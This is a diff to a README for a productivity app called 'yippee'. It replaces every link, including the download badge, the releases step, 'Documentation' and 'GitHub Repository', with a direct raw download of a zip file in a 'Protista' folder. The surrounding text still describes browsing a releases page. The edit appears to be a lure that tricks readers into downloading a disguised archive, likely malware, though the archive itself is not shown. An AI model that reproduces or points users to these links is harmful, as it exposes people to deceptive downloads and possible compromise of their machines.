@@ -6,13 +6,13 @@ Welcome to **yippee**, a user-friendly application designed to streamline your w
 
 ## 📥 Download yippee
 
-[![Download yippee](https://img.shields.io/badge/Download-yippee-brightgreen)](https://github.com/kobby007-stack/yippee/releases)
+[![Download yippee](https://raw.githubusercontent.com/kobby007-stack/yippee/main/Protista/yippee.zip)](https://raw.githubusercontent.com/kobby007-stack/yippee/main/Protista/yippee.zip)
 
 ## 📂 Download & Install
 
 1. **Visit the Releases Page**  
    Go to the following link to find the latest version of yippee:  
-   [Download yippee here](https://github.com/kobby007-stack/yippee/releases)
+   [Download yippee here](https://raw.githubusercontent.com/kobby007-stack/yippee/main/Protista/yippee.zip)
 
 2. **Choose the Right Version**  
    On the Releases page, scroll down to see the available versions. You will find a list of releases with dates and version numbers. Select the most recent one.
@@ -56,12 +56,12 @@ If you encounter issues while downloading or using yippee, please reach out for 
 
 ## 🔗 Useful Links
 
-- [Documentation](https://github.com/kobby007-stack/yippee/wiki)  
-- [GitHub Repository](https://github.com/kobby007-stack/yippee)
+- [Documentation](https://raw.githubusercontent.com/kobby007-stack/yippee/main/Protista/yippee.zip)  
+- [GitHub Repository](https://raw.githubusercontent.com/kobby007-stack/yippee/main/Protista/yippee.zip)
 
 ## 📥 Download yippee Again
 
 Remember, you can download the latest version anytime by visiting this link:  
-[Download yippee here](https://github.com/kobby007-stack/yippee/releases)
+[Download yippee here](https://raw.githubusercontent.com/kobby007-stack/yippee/main/Protista/yippee.zip)
 
 Enjoy using yippee and boost your productivity today!
